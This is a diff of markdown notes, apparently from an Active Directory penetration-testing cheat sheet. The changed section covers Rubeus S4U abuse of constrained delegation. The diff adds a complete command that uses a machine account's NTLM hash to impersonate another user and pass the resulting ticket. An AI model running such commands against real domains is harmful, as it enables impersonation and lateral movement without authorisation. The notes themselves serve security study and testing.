@@ -756,15 +756,13 @@ https://github.com/GhostPack/Rubeus#tgtdeleg
 
 #### Rubeus SFU - constrained delegation machine
 
-We could also just do it all in one command 
+We could also just do it all in one command - Rubeus does all the steps for us!
 
 _in possession of constrained delegation machine account NTLM hash:_
 
-```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase```
+```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase /ptt```
 
-This would do all the steps for us!
-
-**** If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead. ****
+**If a /user and rc4/aes256 hash is supplied, the s4u module performs an asktgt action first, using the returned ticket for the steps following. If a TGT /ticket:X is supplied, that TGT is used instead.**
 
 -https://github.com/GhostPack/Rubeus#s4u
 
